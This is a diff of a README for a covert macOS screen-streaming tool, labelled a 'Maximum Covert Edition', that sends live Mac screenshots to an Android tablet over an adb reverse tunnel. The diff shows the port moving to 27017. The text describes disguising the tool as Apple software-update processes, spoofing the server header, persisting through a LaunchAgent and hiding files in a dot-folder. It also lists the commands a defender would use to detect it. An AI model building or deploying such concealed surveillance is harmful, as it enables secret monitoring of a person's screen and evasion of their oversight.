@@ -25,16 +25,16 @@ screencapture -x -t jpg   (macOS built-in, runs every 400ms)
     ↓ native 1440×900 JPEG (~180KB/frame)
     ↓ saved to /tmp/com.apple.SoftwareUpdate.cache.jpg
     ↓
-server.py  (pure Python3 HTTP server, port 9090)
+server.py  (pure Python3 HTTP server, port 27017)
     ├── GET /                          → HTML page (auto-refreshes image)
     ├── GET /progress/assets/screen.jpg → latest JPEG frame
     └── GET /update/status             → JSON health check
     ↓
 USB reverse tunnel via ADB
-  adb reverse tcp:9090 tcp:9090
+  adb reverse tcp:27017 tcp:27017
     ↓
 Chrome on Samsung tablet
-  opens → http://127.0.0.1:9090/
+  opens → http://127.0.0.1:27017/
   sees  → live Mac screen, fullscreen, auto-refreshing
 ```
 
@@ -46,8 +46,8 @@ macOS Monterey+ silently delivers stale/cached frames via `AVCaptureScreenInput`
 
 | Mode | URL on tablet | When to use |
 |------|---------------|-------------|
-| USB tunnel (`adb reverse`) | `http://127.0.0.1:9090/` | Primary — fastest, no Wi-Fi needed |
-| Wi-Fi direct | `http://<mac-lan-ip>:9090/` | Fallback — works on same network |
+| USB tunnel (`adb reverse`) | `http://127.0.0.1:27017/` | Primary — fastest, no Wi-Fi needed |
+| Wi-Fi direct | `http://<mac-lan-ip>:27017/` | Fallback — works on same network |
 
 ---
 
@@ -127,8 +127,8 @@ launchctl load ~/Library/LaunchAgents/com.institute.backgroundsyncd.plist
 ### Open on tablet
 
 1. Connect tablet via USB
-2. Run `adb -s R52X708VMWW reverse tcp:9090 tcp:9090` (wrapper does this automatically)
-3. Open Chrome on tablet → navigate to `http://127.0.0.1:9090/`
+2. Run `adb -s R52X708VMWW reverse tcp:27017 tcp:27017` (wrapper does this automatically)
+3. Open Chrome on tablet → navigate to `http://127.0.0.1:27017/`
 4. Tap screen once → Chrome goes fullscreen (address bar hides)
 
 ---
@@ -187,7 +187,7 @@ Run it: `./qa_test.sh` — prints PASS / FAIL / WARN per test.
 
 ### Phase 2 (v2.0) — Maximum Covert Edition *(current)*
 - Replaced ffmpeg with `screencapture` loop → stale frame bug eliminated
-- Port changed to 9090
+- Port changed to 27017
 - Process renamed via `exec -a com.apple.SoftwareUpdateCheck`
 - Frame route changed to `/progress/assets/screen.jpg`
 - Server header changed to `AppleHTTPD/2.4`
@@ -212,8 +212,8 @@ Run it: `./qa_test.sh` — prints PASS / FAIL / WARN per test.
 ADB=/usr/local/share/android-commandlinetools/platform-tools/adb
 SERIAL=R52X708VMWW
 
-$ADB -s $SERIAL reverse tcp:9090 tcp:9090
-$ADB -s $SERIAL shell "am start -a android.intent.action.VIEW -d 'http://127.0.0.1:9090/' com.android.chrome"
+$ADB -s $SERIAL reverse tcp:27017 tcp:27017
+$ADB -s $SERIAL shell "am start -a android.intent.action.VIEW -d 'http://127.0.0.1:27017/' com.android.chrome"
 sleep 4
 $ADB -s $SERIAL shell input tap 600 400   # triggers JS requestFullscreen()
 sleep 2
@@ -230,8 +230,8 @@ A defender with basic skills finds this within minutes. These are the weakest po
 
 | Difficulty | Command | What it reveals |
 |-----------|---------|----------------|
-| Trivial | `lsof -iTCP:9090 -sTCP:LISTEN` | python3 on non-standard port |
-| Trivial | Browse `http://localhost:9090/` | Live Mac screen immediately |
+| Trivial | `lsof -iTCP:27017 -sTCP:LISTEN` | python3 on non-standard port |
+| Trivial | Browse `http://localhost:27017/` | Live Mac screen immediately |
 | Trivial | System Prefs → Privacy → Screen Recording | Terminal has permission |
 | Easy | `ls -la ~/Library/` | `.AppleDiagnostics` dot-folder |
 | Easy | `ls ~/Library/.AppleDiagnostics/` | Entire operation exposed |
